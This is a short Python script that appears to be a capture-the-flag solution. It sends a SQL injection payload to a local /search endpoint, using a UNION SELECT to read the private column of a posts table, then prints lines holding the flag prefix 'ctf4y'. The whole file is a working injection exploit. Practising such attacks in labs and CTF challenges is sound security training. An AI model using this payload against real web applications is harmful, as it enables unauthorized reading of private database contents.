import requests
import os

PORT = os.environ.get("PORT", "9999")
URL = "http://localhost:{port}/search".format(port=PORT)
r = requests.get(
    URL,
    params={
        "query": "X' UNION SELECT id, content, private FROM posts WHERE id=1 AND '%'='"
    },
)
for line in r.text.splitlines():
    if "ctf4y" in line:
        print(line)
